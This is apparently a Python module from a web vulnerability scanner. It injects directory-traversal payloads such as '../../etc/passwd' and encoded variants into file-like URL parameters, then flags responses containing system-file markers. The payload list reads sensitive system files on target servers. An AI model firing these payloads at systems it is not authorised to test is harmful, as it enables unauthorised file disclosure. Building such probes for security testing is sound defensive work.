"""
path_traversal.py - Path traversal / directory traversal probe.

Injects ../ sequences into file/path parameters and checks if
sensitive file contents appear in the response.
"""
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from urllib.parse import urlparse, urlencode, urlunparse
from modules.explain import get_explanation
from utils.logger import get_logger

log = get_logger(__name__)

# Parameters likely to accept file paths
PATH_PARAMS = {
    "file", "path", "page", "include", "doc", "document", "folder",
    "root", "dir", "template", "view", "load", "read", "filename",
    "filepath", "name", "resource", "src", "source", "content",
    "lang", "language", "locale", "module", "conf", "config",
}

TRAVERSAL_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "....//....//etc/passwd",
    "..\\..\\windows\\win.ini",
    "..%5c..%5cwindows%5cwin.ini",
]

# Indicators that traversal succeeded
TRAVERSAL_INDICATORS = [
    "root:x:",
    "daemon:x:",
    "/bin/bash",
    "/bin/sh",
    "[extensions]",      # win.ini
    "[fonts]",
    "for 16-bit app support",
]


def probe_path_traversal(endpoints, requester, explain=False):
    """
    Inject path traversal payloads into file/path-like parameters.
    Returns a list of issue dicts.
    """
    issues = []
    tested = set()

    for ep in endpoints:
        url = ep["url"]
        params = ep.get("params", {})

        for param in params:
            if param.lower() not in PATH_PARAMS:
                continue

            key = f"{url}:{param}"
            if key in tested:
                continue
            tested.add(key)

            for payload in TRAVERSAL_PAYLOADS:
                injected = dict(params)
                injected[param] = payload
                parsed = urlparse(url)
                probe_url = urlunparse(parsed._replace(query=urlencode(injected)))

                try:
                    resp = requester._session.get(
                        probe_url, timeout=8, verify=False, allow_redirects=False
                    )
                    body = resp.text

                    for indicator in TRAVERSAL_INDICATORS:
                        if indicator in body:
                            issue = {
                                "type": "Path Traversal",
                                "endpoint": url,
                                "param": param,
                                "payload": payload,
                                "risk": "High",
                                "detail": f"Response contains: '{indicator}'",
                                "confidence": "High",
                            }
                            if explain:
                                issue["reason"] = get_explanation("path_traversal")
                            issues.append(issue)
                            log.debug(f"Path traversal confirmed: {url} param={param}")
                            break

                except Exception:
                    pass

    return issues
